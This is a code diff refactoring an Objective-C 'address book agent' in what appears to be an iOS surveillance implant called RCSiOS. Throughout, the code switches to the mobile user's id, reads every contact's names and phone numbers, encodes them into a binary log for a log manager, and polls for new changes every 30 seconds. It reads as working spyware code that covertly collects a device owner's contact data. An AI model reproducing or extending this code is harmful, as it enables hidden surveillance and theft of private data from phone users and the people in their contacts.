@@ -1,5 +1,5 @@
 /*
- * RCSIpony - messages agent
+ * RCSiOS - messages agent
  *
  *
  * Created by Massimo Chiodini on 12/12/2009
@@ -14,13 +14,49 @@
 #import "RCSIAgentAddressBook.h"
 
 //#define DEBUG
-//#define ALL_ADDRESS ~0
+
+NSString *kRCSIAgentAddressBookRunLoopMode = @"kRCSIAgentAddressBookRunLoopMode";
+
+typedef struct _Names {
+#define   CONTACTNAME    0xC025  
+  int     magic;  
+  int     len;
+  //wchar_t buffer[1];
+} Names;
+
+typedef struct _ABNumbers {
+#define   CONTACTNUM    0xC024  
+  int     magic;
+  int     type;
+  //Names   number;
+} ABNumbers;
+
+typedef struct _ABContats {
+#define   CONTACTCNT    0xC023 
+  int         magic;
+  int         numContats;
+  //ABNumbers contact[1];
+} ABContats;
+
+typedef struct _ABFile {
+#define     CONTACTFILE 0xC022  
+  int       magic;
+  int       len;
+  //Names      first;
+  //Names      last;
+  //ABContacts contact[1];
+} ABFile;
+
+typedef struct _ABLogStrcut {
+#define   CONTACTLIST   0xC021
+  int     magic;
+  int     len;
+  int     numRecords;
+  //ABFile  file[1];
+} ABLogStrcut;
+
 #define ALL_ADDRESS (NSTimeInterval)0
-
-static RCSIAgentAddressBook *sharedAgentAddressBook = nil;
-
-// Now the status is updated by agent Calendar
-static BOOL gAgentStopped = FALSE;
+#define CFRELEASE(x) {if(x!=NULL)CFRelease(x);}
 
 @interface RCSIAgentAddressBook (hidden)
 
@@ -29,8 +65,7 @@ static BOOL gAgentStopped = FALSE;
 - (BOOL)_getAgentABProperty;
 - (BOOL)_setAgentABProperty;
 - (BOOL)_writeABLog: (NSMutableArray *)records;
-- (BOOL)_getAddressBook: (ABAddressBookRef)addressBookA
-           withDateTime: (CFAbsoluteTime)dateTime;
+- (BOOL)_getABWithDateTime: (CFAbsoluteTime)dateTime;
 
 @end
 
@@ -43,17 +78,10 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   
   RCSIAgentAddressBook *agentAB = (RCSIAgentAddressBook *) context;
   
-  // Semaphore signaled
-  int sem = 0;
-  sem = [agentAB _incSemaphore];
-  
-#ifdef DEBUG  
-  NSLog(@"ABNotificationCallback: notification received with observer %@ and info %@. (0x%X) semaphore count = %d", 
-        agentAB, info, info, sem);
-#endif
+  [agentAB _incSemaphore];
   
   [pool release];
-  
+
   return; 
 }
 
@@ -106,29 +134,19 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   NSDictionary *agentDict = nil;
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
-#ifdef DEBUG
-  NSLog(@"_getAgentABProperty: getting property list!");
-#endif
   
   agentDict = rcsPropertyWithName([[self class] description]);
   
   if (agentDict == nil) 
     {
-#ifdef DEBUG
-      NSLog(@"_getAgentABProperty: getting prop failed!");
-#endif
       mLastABDateTime = 0;
     }
   else 
     {
       mLastABDateTime = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
+      [agentDict release];
     }
 
-#ifdef DEBUG
-  NSLog(@"_getAgentABProperty: mLastABDateTime %lu", mLastABDateTime);
-#endif  
-  
   [outerPool release];
   
   return YES;
@@ -136,104 +154,26 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
 
 - (ABAddressBookRef)_getAddressBookRef
 {
-  // fix for iOS4
-//  struct passwd     *ePasswd;
   int               eUid;
   ABAddressBookRef  addressBook;
   
-  // Current euser id
   eUid = geteuid();
-
-#ifdef DEBUG    
-  NSLog(@"_getAddressBookRef: euid= %d", eUid);
-#endif 
   
-  // Get uid for query mobile user AddressBook
-  // ePasswd = getpwnam("mobile");
-  
-//  if (ePasswd == NULL) 
-//    {
-//#ifdef DEBUG    
-//      NSLog(@"_getAddressBookRef: error get uid for mobile users");
-//#endif   
-//      return NULL;
-//    }
-  
-#ifdef DEBUG 
-  NSLog(@"_getAddressBookRef: before seteuid uid %d, euid %d gid %d", 
-        getuid(), geteuid(), getgid());
-#endif
-  
-  // Setting the id and run the query
-  if( seteuid(501/*ePasswd->pw_uid*/) < 0)
+  if( seteuid(501) < 0)
     {
-#ifdef DEBUG 
-      NSLog(@"_getAddressBookRef: cannot seteuid from mobile user");
-      //free(ePasswd);
-      return NULL;
-#endif    
+      return NULL;  
     }
-  
-#ifdef DEBUG   
-  NSLog(@"_getAddressBookRef: after seteuid uid %d, euid %d, gid %d", 
-        getuid(), geteuid(), getgid());
-#endif
-  
-  // Open AddressBook
+
   addressBook = ABAddressBookCreate();
   
-  // Reverting the privs
   if( seteuid(eUid) < 0)
     {
-#ifdef DEBUG    
-    NSLog(@"_getAddressBookRef: cannot revert uid for prev users");
-#endif 
-      CFRelease(addressBook);
-      //free(ePasswd);
+      CFRELEASE(addressBook);
       return NULL;
     }
   
-  //free(ePasswd);
   return addressBook;
 }
-
-typedef struct _Names {
-#define   CONTACTNAME    0xC025  
-  int     magic;  
-  int     len;
-  //wchar_t buffer[1];
-} Names;
-
-typedef struct _ABNumbers {
-#define   CONTACTNUM    0xC024  
-  int     magic;
-  int     type;
-  //Names   number;
-} ABNumbers;
-
-typedef struct _ABContats {
-#define   CONTACTCNT    0xC023 
-  int         magic;
-  int         numContats;
-  //ABNumbers contact[1];
-} ABContats;
-
-typedef struct _ABFile {
-#define     CONTACTFILE 0xC022  
-  int       magic;
-  int       len;
-  //Names      first;
-  //Names      last;
-  //ABContacts contact[1];
-} ABFile;
-
-typedef struct _ABLogStrcut {
-#define   CONTACTLIST   0xC021
-  int     magic;
-  int     len;
-  int     numRecords;
-  //ABFile  file[1];
-} ABLogStrcut;
 
 - (BOOL)_writeABLog: (NSMutableArray *)records
 {
@@ -272,12 +212,14 @@ typedef struct _ABLogStrcut {
       // FirstName abNames
       abNames.len = [firstN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
       [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
-      [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
+      [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
+                   length: abNames.len];
       
       // LastName abNames
       abNames.len = [lastN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
       [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
-      [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
+      [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
+                   length: abNames.len];
       
       // Telephone numbers
       abContat.numContats = [num count];
@@ -290,331 +232,250 @@ typedef struct _ABLogStrcut {
           abNumber.type = a;
           [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
         
-//          NSString *label = [telNum objectForKey: @"Label"];
-//          abNames.len = [label lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
-//        
-//          [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
-//          [abData appendBytes: (const void *) [label UTF8String] length: abNames.len];
-        
           NSString *number = [telNum objectForKey: @"Number"];
           abNames.len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
           
           [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
-          [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
+          [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
+                       length: abNames.len];
         }
     }
   
-    // Setting len of NSData - sizeof(magic)
-    ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
-    logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
+  // Setting len of NSData - sizeof(magic)
+  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
+  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
   
-#ifdef DEBUG
-  NSLog(@"_writeABLog: abData %@", abData);
-#endif
-  
-  // No additional param header required
+
   RCSILogManager *logManager = [RCSILogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                            agentHeader: nil
                              withLogID: 0];
-  // Write data to log
+
   if (success == TRUE)
     {
-    if ([logManager writeDataToLog: abData
-                          forAgent: LOG_ADDRESSBOOK
-                         withLogID: 0] == TRUE)
-      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
+      if ([logManager writeDataToLog: abData
+                            forAgent: LOG_ADDRESSBOOK
+                           withLogID: 0] == TRUE)
+        {
+          [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
+        }
     }
+  else
+    return NO;
 
   return YES;
 }
 
-- (BOOL)_getAddressBook: (ABAddressBookRef)addressBookA
-           withDateTime: (CFAbsoluteTime)dateTime
+- (NSMutableArray*)getABNumbers:(ABMutableMultiValueRef)multi
 {
-  int                     sem = 0;
-  CFDateRef               cfDateTime;
-  CFStringRef             firstName, lastName, compositeName;
-  CFStringRef             phoneNumber, phoneNumberLabel;
-  CFArrayRef              people;
-  CFAbsoluteTime          currDateTime, lMaxDateTime = dateTime;
+  NSMutableArray  *numbers = nil;
+  CFStringRef     phoneNumber, phoneNumberLabel;
+  NSDictionary    *telNum;
+  
+  numbers = [[NSMutableArray alloc] initWithCapacity: 0];
+  
+  for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
+    {
+      phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
+      if (phoneNumberLabel == NULL) 
+        continue;
+    
+      phoneNumber = ABMultiValueCopyValueAtIndex(multi, i);
+      
+      if (phoneNumber == NULL) 
+        {
+          CFRELEASE(phoneNumberLabel);
+          continue;
+        }
+    
+      telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (id)phoneNumberLabel, 
+                                                             @"Label", 
+                                                             phoneNumber, 
+                                                             @"Number", nil]; 
+      [numbers addObject: telNum];
+      
+      [telNum release];
+      CFRELEASE(phoneNumberLabel);
+      CFRELEASE(phoneNumber);
+    }
+  
+  return numbers;
+}
+
+- (ABMutableMultiValueRef)getPhones:(ABRecordRef)person
+{
+  ABMutableMultiValueRef multi;
+  
+  multi = ABRecordCopyValue(person, kABPersonPhoneProperty);
+  
+  if (multi == NULL)
+    {
+      ABRecordID uid = ABRecordGetRecordID(person);
+    
+      if (uid == kABRecordInvalidID)
+        return multi;
+        
+      ABAddressBookRef addressBook = [self _getAddressBookRef];
+     
+      if (addressBook == NULL)
+        return multi;
+    
+      ABRecordRef tmpPerson = ABAddressBookGetPersonWithRecordID(addressBook, uid);
+      multi = ABRecordCopyValue(tmpPerson, kABPersonPhoneProperty);
+    }
+  
+  return multi;
+}
+
+- (NSMutableArray*)getABContacts:(CFArrayRef)people
+                    withDateTime:(CFAbsoluteTime)dateTime
+{
+  static CFStringRef  nullName = CFSTR("");
+  
+  CFIndex         count;
+  CFDateRef       cfDateTime;
+  CFAbsoluteTime  currDateTime, lMaxDateTime = dateTime;
+  CFStringRef     firstName, lastName;
+  NSDictionary    *rec;
+  
   ABMutableMultiValueRef  multi;
-  ABAddressBookRef        addressBook;
-  NSMutableArray          *abRecords = nil, *numbers = nil;
-  NSDictionary            *telNum, *rec;
-  static CFStringRef      nullName = CFSTR("");
   
-#ifdef DEBUG
-  NSLog(@"_getAddressBook: run with datetime %ld", dateTime);
-#endif
+  if ([self isThreadCancelled] == YES)
+    return nil;
   
-  // Reset semaphore for realtime changes
-  if (dateTime > ALL_ADDRESS) 
-    {
-#ifdef DEBUG    
-      NSLog(@"_getAddressBook: semaphore count before = %d", abChanges);
-#endif
-      sem = [self _decSemaphore];
-#ifdef DEBUG    
-      NSLog(@"_getAddressBook: semaphore count after  = %d", sem);
-#endif     
-    }
+  if ((count = CFArrayGetCount(people)) == 0)
+    return nil;
   
-  // Get the mobile user AB
-  addressBook = [self _getAddressBookRef];
-  
-  if (addressBook == NULL) 
-    {
-#ifdef DEBUG    
-      NSLog(@"_getAddressBook: error setting uid");
-#endif 
-      return NO;
-    }
-  
-  if (ABAddressBookHasUnsavedChanges(addressBook) == YES)
-    {
-#ifdef DEBUG
-      NSLog(@"_getAddressBook: have unsaved data");
-#endif
-      return YES;
-    }
-  else 
-    {
-#ifdef DEBUG
-      NSLog(@"_getAddressBook: doesn't have unsaved data");
-#endif
-    }
-  
-  // Dump all person on the addressBook
-  people = ABAddressBookCopyArrayOfAllPeople(addressBook);
-  
-  if (people == NULL) 
-    {
-#ifdef DEBUG
-      NSLog(@"_getAddressBook: haven't records");
-#endif
-      return NO;
-    }
-  
-  CFIndex count = CFArrayGetCount(people);
-  
-#ifdef DEBUG
-  NSLog(@"_getAddressBook: num of addresses %d, dateTime %lu", count, dateTime);
-#endif
-  
-  abRecords = [[NSMutableArray alloc] initWithCapacity:0];
-  
+  NSMutableArray *abRecords = [[NSMutableArray alloc] initWithCapacity:0];
+    
   for (int i=0; i<count; i++) 
     {
       ABRecordRef person = CFArrayGetValueAtIndex(people, i);
-       
+      
       if (person != NULL && ABRecordGetRecordType(person) == kABPersonType) 
         {
-          compositeName = ABRecordCopyCompositeName(person);
           firstName     = ABRecordCopyValue(person, kABPersonFirstNameProperty);
           lastName      = ABRecordCopyValue(person, kABPersonLastNameProperty); 
-          multi         = ABRecordCopyValue(person, kABPersonPhoneProperty);
+          multi         = [self getPhones:person];
           cfDateTime    = ABRecordCopyValue(person, kABPersonModificationDateProperty);
-
-          if (cfDateTime  != NULL)
+          
+          if (cfDateTime != NULL)
             {
-              currDateTime  = CFDateGetAbsoluteTime(cfDateTime);
-#ifdef DEBUG
-              //NSLog(@"_getAddressBook: currDateTime %d ", currDateTime);
-#endif
+              currDateTime = CFDateGetAbsoluteTime(cfDateTime);
             }
           else 
-            {
-#ifdef DEBUG
-              //NSLog(@"_getAddressBook: record datetime null");
-#endif             
-              if (firstName != NULL)  CFRelease(firstName);
-              if (lastName != NULL)   CFRelease(lastName);
-              if (multi != NULL)      CFRelease(multi);
+            { 
+              CFRELEASE(firstName);
+              CFRELEASE(lastName);
+              CFRELEASE(multi);
               continue;
             }
-
-          if ((lastName != NULL || firstName != NULL) && 
-               multi != NULL && 
+        
+          if (((lastName != NULL || firstName != NULL) && multi != NULL)  && 
               (dateTime == ALL_ADDRESS || currDateTime > dateTime))
             {
-              // Update last record parsed 
               if (currDateTime > lMaxDateTime)
                 lMaxDateTime = currDateTime;
-            
-              numbers   = [[NSMutableArray alloc] initWithCapacity: 0];
-            
-              for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
-                {
-                  phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
-                  if (phoneNumberLabel == NULL) 
-                    continue;
-                  phoneNumber      = ABMultiValueCopyValueAtIndex(multi, i);
-                  if (phoneNumber == NULL) 
-                    {
-                      CFRelease(phoneNumberLabel);
-                      continue;
-                    }
-#ifdef DEBUG     
-                  NSString *label = (NSString *)phoneNumberLabel;
-                  NSLog(@"_getAddressBook: [%@] composite Name %@, first Name %@, last Name %@, phone [%s:%@]", 
-                        cfDateTime, 
-                        compositeName != NULL ? compositeName : nullName,
-                        firstName     != NULL ? firstName : nullName, 
-                        lastName      != NULL ? lastName : nullName, 
-                        [label cStringUsingEncoding: NSASCIIStringEncoding] , phoneNumber);
-#endif           
-                  telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (NSString *)phoneNumberLabel, @"Label", 
-                                                                         (NSString *)phoneNumber, @"Number", nil]; 
-                  [numbers addObject: telNum];
-                
-                  [telNum release];
-                
-                  CFRelease(phoneNumberLabel);
-                  CFRelease(phoneNumber);
-                }
-            
-              rec = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: firstName != NULL ? (NSString *)firstName : (NSString *)nullName, 
-                                                                                      lastName  != NULL ? (NSString *)lastName : (NSString *)nullName,
-                                                                                      numbers,  
-                                                                                      nil]
-                                                  forKeys: [NSArray arrayWithObjects: @"First", 
-                                                                                      @"Last", 
-                                                                                      @"Numbers", 
-                                                                                      nil]];
+              
+              NSMutableArray *numbers = [self getABNumbers:multi];
+              
+              NSArray *objects = 
+                [NSArray arrayWithObjects:(firstName != NULL ? (id)firstName : (id)nullName), 
+                                          (lastName  != NULL ? (id)lastName  : (id)nullName),
+                                          numbers,  
+                                          nil];
+              
+              NSArray *keys = [NSArray arrayWithObjects: @"First", 
+                                                         @"Last", 
+                                                         @"Numbers", 
+                                                         nil];
+              
+              rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
               
               [abRecords addObject: rec];
-#ifdef DEBUG
-              NSLog(@"_getAddressBook: object %@ added to array, count = %d", rec, [abRecords count]);
-#endif
+              
               [numbers release];
               [rec release];
             }
-           
-          if (firstName != NULL)  CFRelease(firstName);
-          if (lastName != NULL)   CFRelease(lastName);
-          if (multi != NULL)      CFRelease(multi);
-          if (cfDateTime != NULL) CFRelease(cfDateTime);
+          
+          CFRELEASE(firstName);
+          CFRELEASE(lastName);
+          CFRELEASE(multi);
+          CFRelease(cfDateTime);
         }
     }
   
-  // Write the log...
-  if ([abRecords count]) 
-    [self _writeABLog: abRecords];
-  
-  // Release objects
-  [abRecords release];
-  CFRelease(people);
-  CFRelease(addressBook);
-  
-  // Update globals and plist
   if (mLastABDateTime < lMaxDateTime) 
     {
       mLastABDateTime = lMaxDateTime;
       [self _setAgentABProperty];
     }
-
-#ifdef DEBUG
-  NSLog(@"_getAddressBook: mLastABDateTime %lu ", mLastABDateTime);
-#endif 
   
+  return abRecords;
+}
+
+- (BOOL)_getABWithDateTime:(CFAbsoluteTime)dateTime
+{
+  CFArrayRef        people;
+  ABAddressBookRef  addressBook;
+
+  if ([self isThreadCancelled] == YES)
+    return NO;
+
+  addressBook = [self _getAddressBookRef];
+  
+  if (addressBook == NULL) 
+    return NO;
+
+  
+  if (ABAddressBookHasUnsavedChanges(addressBook) == YES)
+      return YES;
+
+  people = ABAddressBookCopyArrayOfAllPeople(addressBook);
+  
+  CFRELEASE(addressBook);
+  
+  if (people == NULL || [self isThreadCancelled] == YES) 
+      return NO;
+
+  NSMutableArray *abRecords = [self getABContacts:people withDateTime:dateTime];
+
+  if ([abRecords count]) 
+    [self _writeABLog: abRecords];
+  
+  CFRELEASE(people);
+  
+  [abRecords release];
+
   return YES;
+}
+
+- (void)getABWithDateTime:(NSTimer*)theTimer
+{  
+  [self _getABWithDateTime: mLastABDateTime];
 }
 
 @end
 
-
 @implementation RCSIAgentAddressBook
-
-@synthesize mAgentConfiguration;
 
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSIAgentAddressBook *)sharedInstance
+- (id)initWithConfigData:(NSData *)aData
 {
-  @synchronized(self)
-  {
-    if (sharedAgentAddressBook == nil)
-      {
-        //
-        // Assignment is not done here
-        //
-        [[self alloc] init];
-      }
-  }
+  self = [super initWithConfigData: aData];
   
-  return sharedAgentAddressBook;
-}
-
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-  {
-    if (sharedAgentAddressBook == nil)
-      {
-        sharedAgentAddressBook = [super allocWithZone: aZone];
-        
-        //
-        // Assignment and return on first allocation
-        //
-        return sharedAgentAddressBook;
-      }
-  }
-  
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
+  if (self != nil)
+    {
+      mLastABDateTime = 0;
+      abChanges = 0;
+      mAgentID = AGENT_ADDRESSBOOK;
+    }
+ 
   return self;
-}
-
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  // Denotes an object that cannot be released
-  return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
-}
-
-- (id)init
-{
-  Class myClass = [self class];
-  
-  @synchronized(myClass)
-  {
-    if (sharedAgentAddressBook != nil)
-      {
-        self = [super init];
-        
-        if (self != nil)
-          {
-            //mLastABDateTime = ~0;
-            mLastABDateTime = 0;
-            abChanges = 0;
-            sharedAgentAddressBook = self;            
-          }
-      }
-  }
-  
-  return sharedAgentAddressBook;
 }
 
 #pragma mark -
@@ -622,118 +483,66 @@ typedef struct _ABLogStrcut {
 #pragma mark -
 
 #define CHANGE_TIME 30
-#define WAIT_TIME   2
-#define RL_TIME     1
 
-- (void)start
+- (void)setABPollingTimeOut:(NSTimeInterval)aTimeOut 
+{    
+  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
+                                                    target: self 
+                                                  selector: @selector(getABWithDateTime:) 
+                                                  userInfo: nil 
+                                                   repeats: YES];
+  
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentAddressBookRunLoopMode];
+}
+
+- (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  id                messageRawData;
-  ABAddressBookRef  addressBook;
-  NSTimeInterval    waitSec = WAIT_TIME;
-    
-  messageRawData = [mAgentConfiguration objectForKey: @"data"];
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
 
-  // Get property
-  [self _getAgentABProperty];
-  
-  // Open AddressBook
-  addressBook = [self _getAddressBookRef];
-  
-  if (addressBook == NULL) 
+  if ([self mAgentStatus] != AGENT_STATUS_STOPPED || [self isThreadCancelled] == TRUE)
     {
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
+      [outerPool release];
       return;
     }
   
-  // add the callback for messages (privateFrameworks): registered on main thread runloop!
-  ABAddressBookRegisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *) self);
+  [self _getAgentABProperty];
+
+  ABAddressBookRef addressBook = [self _getAddressBookRef];
   
-  // running for the very first time (mLastABDateTime = 0)
-  if(mLastABDateTime == ALL_ADDRESS)
+  if (addressBook == NULL) 
     {
-       [self _getAddressBook: addressBook withDateTime: ALL_ADDRESS];
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
+      [outerPool release];
+      return;
     }
-
-
-  NSPort *aPort = [NSPort port];
-  [[NSRunLoop currentRunLoop] addPort: aPort 
-                              forMode: NSRunLoopCommonModes];
+ 
+  if(mLastABDateTime == ALL_ADDRESS)
+    [self _getABWithDateTime: ALL_ADDRESS];
+    
+  [self setABPollingTimeOut: CHANGE_TIME];
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+              
+      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentAddressBookRunLoopMode 
+                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
 
-      if (abChanges > 0 && waitSec == CHANGE_TIME) 
-        {
-          // Ok fetch changes
-          [self _getAddressBook: addressBook withDateTime: mLastABDateTime];
-          waitSec = WAIT_TIME;
-        }
-      
-      // First AB change: it will sleep waitSec*RL_TIME 
-      if (abChanges > 0 && waitSec == WAIT_TIME)
-          waitSec = CHANGE_TIME;
-    
-      // Wait waitSec*RL_TIME seconds before fetching AB
-      for (int i=0; i<waitSec; i++) 
-        {        
-          // Check for agent stopped
-          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-            {
-              break;
-            }
-          [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: RL_TIME]];
-        }
-    
       [innerPool release];
     }
   
-  ABAddressBookUnregisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *)self);
+  CFRELEASE(addressBook);
   
-  CFRelease(addressBook);
-  
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-  {
-    // Agent Calendar set the status to STOPPED
-    [mAgentConfiguration setObject: AGENT_STOPPED
-                            forKey: @"status"];
-    gAgentStopped = TRUE;
-  }
-  
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
   
   [outerPool release];
 }
 
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-#ifdef JSON_CONFIG
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= 5)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-#else  
-  while (gAgentStopped != TRUE &&
-         internalCounter <= MAX_WAIT_TIME)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-#endif
-#ifdef DEBUG 
-  NSLog(@"Agent AddressBook stopped");
-#endif
-  
+  [self cancelThread];
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];  
   return YES;
 }
 
